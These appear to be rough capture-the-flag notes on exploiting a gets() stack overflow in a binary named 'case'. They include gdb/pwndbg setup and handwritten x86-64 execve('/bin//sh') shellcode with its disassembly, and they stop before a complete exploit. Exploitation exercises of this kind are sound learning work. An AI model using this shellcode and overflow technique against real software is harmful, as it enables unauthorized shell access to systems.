1st to open the gdb withthe pwndgb we have to deactivate the autoupdate.
As we can't tmodify the file source /opt/pwndbg/gdbinit.py the best way is:
PWNDBG_NO_AUTOUPDATE=1 gdb ./case
Into case.c we find the following lines:
"""
    printf("[SPRAWL//NET] Session %d initialized\n", sid);
    printf("[SPRAWL//NET] Enter credentials: ");
    fflush(stdout);

    gets(credentials);

    log_attempt(credentials, verify_credentials(credentials));
"""
The idea consists in injeting the code in the position where return of the function auth_loop is

for that I create the binary code of a shell program:
vim test.asm 
---
section .test
global _start

_start:
        xor esi, esi
        push rsi
        mov rbx, 0x68732f2f6e69622f
        push rbx
        push rsp
        pop rdi
        push 0x3b
        pop rax
        cdq
        syscall      
---

nasm -f elf64 test.asm -o test.oobjdump -d test.o 
objdump -d test.o

test.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:	31 f6                	xor    %esi,%esi
   2:	56                   	push   %rsi
   3:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
   a:	2f 73 68 
   d:	53                   	push   %rbx
   e:	54                   	push   %rsp
   f:	5f                   	pop    %rdi
  10:	6a 3b                	push   $0x3b
  12:	58                   	pop    %rax
  13:	99                   	cltd   
  14:	0f 05                	syscall 
